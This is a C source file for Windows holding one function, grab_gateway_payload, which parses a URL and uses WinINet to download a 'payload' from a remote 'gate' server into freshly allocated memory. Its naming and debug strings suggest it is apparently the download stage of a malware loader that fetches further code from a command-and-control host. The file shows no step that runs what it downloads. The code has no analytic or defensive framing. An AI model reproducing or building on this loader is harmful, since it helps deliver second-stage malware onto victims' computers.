#include "main.h"

BOOL grab_gateway_payload	(__out		PDWORD *out_buffer, 
							 __out		PUINT out_buffer_size, 
							 __in		LPCSTR url)
{
	ERROR_CODE						status;

	MEMORY_BASIC_INFORMATION		mem_info;

	INTERNET_PORT		port;
	HINTERNET			h_internet_open, h_internet_connect, h_internet_request;

	HANDLE				temp_inbound_heap;

	LPSTR				file;
	PDWORD				file_buffer,
						file_buffer_page_pointer,
						rx_buffer;
	DWORD				file_buffer_size,
						file_buffer_page_bytes,
						page_counter,
						request_flags;
	PBYTE				ptr;
	CHAR				ascii_port[16],
						ascii_host_ip[512];
	INT					rx_buffer_length,
						internet_bytes_avail,
						internet_bytes_read,
						total_bytes_downloaded					= 0,
						i;

#ifdef DEBUG_OUT
	DEBUG("+gate> Trying %s", url);
#endif

	if (url == NULL) {
		return FALSE;
	}

	// Set flags
	request_flags =						INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTP |
										INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTPS |
										INTERNET_FLAG_KEEP_CONNECTION |
										INTERNET_FLAG_NO_AUTH |
										INTERNET_FLAG_NO_AUTO_REDIRECT |
										INTERNET_FLAG_NO_COOKIES |
										INTERNET_FLAG_NO_UI |
										INTERNET_FLAG_RELOAD;
	
	// Get Port
	ptr = (PBYTE)((SIZE_T)url + 7);
	while (*ptr != ':') {
		ptr++;
	}
	ptr++;

	i = 0;
	while (*ptr != '/') {
		i++;
		ptr++;
	}
	file = (LPSTR)ptr;

	ZeroMemory(ascii_port, sizeof(ascii_port));
	CopyMemory(ascii_port, (void *)((SIZE_T)ptr - i), i);
	port = (INTERNET_PORT)f_atoi(ascii_port);	

	// Get hostname or ip
	ZeroMemory(ascii_host_ip, sizeof(ascii_host_ip));
	ptr = (PBYTE)((SIZE_T)url + 7);
	i = 0;
	while (*ptr != ':') {
		i++;
		ptr++;
	}
	CopyMemory(ascii_host_ip, (void *)((SIZE_T)ptr - i), i);


	// Open wininet
	h_internet_open = InternetOpenA(	DEFAULT_INET_AGENT, 
										INTERNET_OPEN_TYPE_PRECONFIG,
										NULL,
										NULL,
										0);
	if (h_internet_open == NULL) {		
#ifdef DEBUG_OUT
		DEBUG("+gate> InternetOpenA Failed");
#endif
		return FALSE;		
	}

	// attempt to connect
	h_internet_connect = InternetConnectA(	h_internet_open,
											ascii_host_ip,
											port,
											NULL,
											NULL,
											INTERNET_SERVICE_HTTP,
											0,
											0);
	if (h_internet_connect == NULL) {
#ifdef DEBUG_OUT
		DEBUG("+gate> InternetConnectA Failed");
#endif
		return FALSE;
	}		

	// Generate request
	h_internet_request = HttpOpenRequestA(	h_internet_connect,
											"GET",
											file,
											NULL,
											NULL,
											NULL,
											request_flags,
											0);
	if (h_internet_request == NULL) {
#ifdef DEBUG_OUT
		DEBUG("+gate> HttpOpenRequestA Failed");
#endif
		return FALSE;
	}

	// Send request
	if (!HttpSendRequestA(h_internet_request, NULL, 0, NULL, 0)) {
#ifdef DEBUG_OUT
		//DEBUG("+gate> Sending HTTP request failed");
#endif
		return FALSE;
	}
	
#ifdef DEBUG_OUT
	//DEBUG("+gate> Downloading...");
#endif

	// Begin downloading
	ptr					= NULL;
	file_buffer			= NULL;
	file_buffer_size	= 0;

	while (TRUE) {

		// What is the size
		if (!InternetQueryDataAvailable(		h_internet_request, 
												(LPDWORD)&internet_bytes_avail, 
												0, 0)) {
			break;
		}

		// Returned an error
		if (internet_bytes_avail == 0) {

			status = GetLastError();

			if (status == 0) {
				break;
			}



			// Some other unexpected error occurred (FIXME)
#ifdef DEBUG_OUT
			DEBUG("+gate> Unknown error");
#endif
			return FALSE;
		}

		// Allocate base, if it doesn't exist
		if (file_buffer == NULL) {

			file_buffer = (PDWORD)VirtualAlloc(NULL, LARGEST_PAYLOAD_SIZE, MEM_RESERVE, PAGE_READWRITE);
			if (file_buffer == NULL) {
#ifdef DEBUG_OUT
				DEBUG("+gate> Failed to allocate sufficient memory");
#endif
				return FALSE;
			}

			// Reserve memory for the first page
			VirtualAlloc(file_buffer, 0x1000, MEM_COMMIT, PAGE_READWRITE);

			ptr = (PBYTE)file_buffer;
			file_buffer_page_pointer = file_buffer;
			file_buffer_page_bytes = 0;
		}

		// Do we need to allocate another page?
		page_counter = internet_bytes_avail;

		while ((page_counter + file_buffer_page_bytes) > 0x1000) {

			if (file_buffer_page_bytes > 0x1000) {

				file_buffer_page_pointer = (PDWORD)VirtualAlloc((LPVOID)((DWORD)file_buffer_page_pointer + 0x1000), 0x1000, MEM_COMMIT, PAGE_READWRITE);
				file_buffer_page_bytes -= 0x1000;

				continue;
			}

			file_buffer_page_pointer = (PDWORD)VirtualAlloc((LPVOID)((DWORD)file_buffer_page_pointer + 0x1000), 0x1000, MEM_COMMIT, PAGE_READWRITE);

			page_counter = (DWORD)((DWORD)page_counter - 0x1000);


		}

		// Read it in
		status = InternetReadFile(		h_internet_request,
										(LPVOID)ptr,
										internet_bytes_avail,
										(LPDWORD)&internet_bytes_read);



		total_bytes_downloaded += internet_bytes_read;
		ptr += internet_bytes_read;
		file_buffer_page_bytes += internet_bytes_read;
		internet_bytes_read = 0;
		
		if (!status) {
#ifdef DEBUG_OUT
			DEBUG("+gate> InternetReadFile failed");
#endif
			return FALSE;
		} 

		internet_bytes_avail	= 0;

	}

	InternetCloseHandle(h_internet_open);
	InternetCloseHandle(h_internet_connect);
	InternetCloseHandle(h_internet_request);

	// setup return
	ZeroMemory(&mem_info, sizeof(MEMORY_BASIC_INFORMATION));
	VirtualQuery(file_buffer, &mem_info, sizeof(MEMORY_BASIC_INFORMATION));
	
	*out_buffer			= (PDWORD)mem_info.AllocationBase;
	*out_buffer_size	= total_bytes_downloaded;


	return TRUE;
}